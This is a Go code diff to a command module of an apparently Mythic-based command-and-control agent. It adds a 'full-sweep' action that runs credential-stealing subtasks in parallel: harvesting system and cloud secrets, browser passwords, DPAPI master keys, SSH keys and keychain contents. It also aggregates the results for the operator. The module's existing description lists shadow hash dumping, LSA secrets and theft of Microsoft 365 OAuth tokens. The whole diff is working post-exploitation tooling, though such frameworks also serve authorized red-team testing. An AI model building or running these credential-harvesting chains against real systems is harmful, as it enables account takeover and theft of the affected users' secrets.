@@ -35,7 +35,7 @@ func init() {
 				ModalDisplayName: "Action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
 				Description:      "shadow: system password hashes (Unix). cloud: cloud/infra credentials. configs: application secrets. history: scan shell history for leaked credentials. windows: PowerShell history, env vars, RDP, WiFi. m365-tokens: OAuth/JWT from TokenBroker, Teams, Outlook (Windows). all: run all platform-appropriate actions. dump-all: automated chain — runs hashdump + lsa-secrets + cred-harvest all in parallel via subtasks (Windows).",
-				Choices:          []string{"all", "shadow", "cloud", "configs", "history", "windows", "m365-tokens", "dump-all"},
+				Choices:          []string{"all", "shadow", "cloud", "configs", "history", "windows", "m365-tokens", "dump-all", "full-sweep"},
 				DefaultValue:     "all",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{ParameterIsRequired: true, GroupName: "Default", UIModalPosition: 0},
@@ -142,7 +142,8 @@ func init() {
 			}
 		},
 		TaskCompletionFunctions: map[string]agentstructs.PTTaskCompletionFunction{
-			"dumpAllComplete": credHarvestDumpAllComplete,
+			"dumpAllComplete":  credHarvestDumpAllComplete,
+			"fullSweepComplete": credHarvestFullSweepComplete,
 		},
 		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
 			response := agentstructs.PTTaskCreateTaskingMessageResponse{
@@ -188,6 +189,46 @@ func init() {
 
 				createArtifact(taskData.Task.ID, "Subtask Chain",
 					"Credential Harvest Chain: hashdump + lsa-secrets + cred-harvest all (parallel)")
+				return response
+			}
+
+			// full-sweep: exhaustive credential collection (cred-harvest all + browser + dpapi + ssh-keys + keychain)
+			if action == "full-sweep" {
+				display := "Full Credential Sweep (cred-harvest + browser + dpapi + ssh-keys + keychain)"
+				response.DisplayParams = &display
+				completionFunc := "fullSweepComplete"
+				response.CompletionFunctionName = &completionFunc
+
+				tasks := []mythicrpc.MythicRPCTaskCreateSubtaskGroupTasks{
+					{CommandName: "cred-harvest", Params: `{"action":"all"}`},
+					{CommandName: "browser", Params: `{"action":"passwords"}`},
+					{CommandName: "dpapi", Params: `{"action":"masterkeys"}`},
+					{CommandName: "ssh-keys", Params: `{"action":"list"}`},
+					{CommandName: "keychain", Params: `{}`},
+				}
+
+				groupResult, err := mythicrpc.SendMythicRPCTaskCreateSubtaskGroup(
+					mythicrpc.MythicRPCTaskCreateSubtaskGroupMessage{
+						TaskID:                taskData.Task.ID,
+						GroupName:             "credential_full_sweep",
+						GroupCallbackFunction: &completionFunc,
+						Tasks:                 tasks,
+					},
+				)
+				if err != nil || !groupResult.Success {
+					errMsg := "Failed to create full sweep subtask group"
+					if err != nil {
+						errMsg = fmt.Sprintf("Failed to create subtask group: %s", err.Error())
+					} else if groupResult != nil {
+						errMsg = fmt.Sprintf("Failed to create subtask group: %s", groupResult.Error)
+					}
+					response.Success = false
+					response.Error = errMsg
+					return response
+				}
+
+				createArtifact(taskData.Task.ID, "Subtask Chain",
+					"Full Credential Sweep: cred-harvest + browser + dpapi + ssh-keys + keychain (parallel)")
 				return response
 			}
 
@@ -284,6 +325,59 @@ func credHarvestDumpAllComplete(taskData *agentstructs.PTTaskMessageAllData, sub
 	response.Stdout = &summary
 
 	// Also create a response on the parent task so it shows in the UI
+	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
+		TaskID:   parentID,
+		Response: []byte(summary),
+	})
+
+	return response
+}
+
+// credHarvestFullSweepComplete aggregates results from the full credential sweep subtask group.
+func credHarvestFullSweepComplete(taskData *agentstructs.PTTaskMessageAllData, subtaskData *agentstructs.PTTaskMessageAllData, groupName *agentstructs.SubtaskGroupName) agentstructs.PTTaskCompletionFunctionMessageResponse {
+	response := agentstructs.PTTaskCompletionFunctionMessageResponse{
+		TaskID:  taskData.Task.ID,
+		Success: true,
+	}
+
+	parentID := taskData.Task.ID
+	searchResult, err := mythicrpc.SendMythicRPCTaskSearch(mythicrpc.MythicRPCTaskSearchMessage{
+		TaskID:             parentID,
+		SearchParentTaskID: &parentID,
+	})
+
+	if err != nil || !searchResult.Success {
+		completed := true
+		response.Completed = &completed
+		summary := "Full Credential Sweep completed (could not aggregate results)"
+		response.Stdout = &summary
+		return response
+	}
+
+	var summaryParts []string
+	successCount := 0
+	errorCount := 0
+
+	for _, task := range searchResult.Tasks {
+		status := "unknown"
+		if task.Completed {
+			if task.Status == "error" {
+				status = "ERROR"
+				errorCount++
+			} else {
+				status = "SUCCESS"
+				successCount++
+			}
+		}
+		summaryParts = append(summaryParts, fmt.Sprintf("[%s] %s: %s", status, task.CommandName, task.DisplayParams))
+	}
+
+	completed := true
+	response.Completed = &completed
+	summary := fmt.Sprintf("=== Full Credential Sweep Complete ===\nSubtasks: %d success, %d errors\n\n%s",
+		successCount, errorCount, strings.Join(summaryParts, "\n"))
+	response.Stdout = &summary
+
 	mythicrpc.SendMythicRPCResponseCreate(mythicrpc.MythicRPCResponseCreateMessage{
 		TaskID:   parentID,
 		Response: []byte(summary),
